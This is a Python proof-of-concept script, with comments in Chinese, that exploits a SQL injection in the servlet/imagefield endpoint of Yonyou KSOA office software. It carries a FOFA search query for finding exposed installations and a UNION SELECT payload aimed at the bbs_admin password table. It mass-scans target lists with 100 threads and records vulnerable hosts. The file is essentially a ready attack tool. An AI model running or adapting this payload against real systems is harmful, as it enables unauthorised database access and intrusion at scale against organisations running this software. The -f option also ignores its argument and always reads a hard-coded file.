#用友时空KSOA_servletimagefield文件sKeyvalue参数SQL注入
#fofa:app="用友-时空KSOA"

import requests,sys,argparse,json,re
from multiprocessing.dummy import Pool
# 关闭警告
requests.packages.urllib3.disable_warnings()

def banner():
    test ="""
██╗  ██╗███████╗ ██████╗  █████╗         ███████╗ ██████╗ ██╗     
██║ ██╔╝██╔════╝██╔═══██╗██╔══██╗        ██╔════╝██╔═══██╗██║     
█████╔╝ ███████╗██║   ██║███████║        ███████╗██║   ██║██║     
██╔═██╗ ╚════██║██║   ██║██╔══██║        ╚════██║██║▄▄ ██║██║     
██║  ██╗███████║╚██████╔╝██║  ██║███████╗███████║╚██████╔╝███████╗
╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝ ╚══▀▀═╝ ╚══════╝                                                               
                                                                                                                                                                                      
"""
    print(test)
def main():
    banner()
    parse = argparse.ArgumentParser(description="用友时空KSOA_servletimagefield文件sKeyvalue参数SQL注入")
    parse.add_argument('-u','--url',dest='url',type=str,help="please input you url")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input you file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)

    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    payload = "/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))--+"
    headers = {
        'User-Agent':'Mozilla/5.0(Macintosh;IntelMacOSX10_14_3)AppleWebKit/605.1.15(KHTML,likeGecko)',
        'Accept-Encoding':'gzip,deflate',
        'Connection':'close',
            }
    proxies ={
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    } 
    try:
        res1 = requests.get(url=target+payload,headers=headers,verify=False,proxies=proxies)
        if res1.status_code==200 and '098f6bcd4621d373cade4e832627b4f6' in res1.text:
            print(f'[+]{target}存在漏洞')
            with open('result.txt','a',encoding='utf-8') as fp1:
                fp1.write(target+'\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except requests.RequestException as e:
        print(f"[-] 请求失败: {target}, 错误信息: {e}")
    except json.JSONDecodeError:
        print(f"[-] 无法解码JSON响应: {target}")
    except Exception as e:
        print(f"[-] 处理请求时出错: {target}, 错误信息: {e}")    

if __name__ == "__main__":
    main()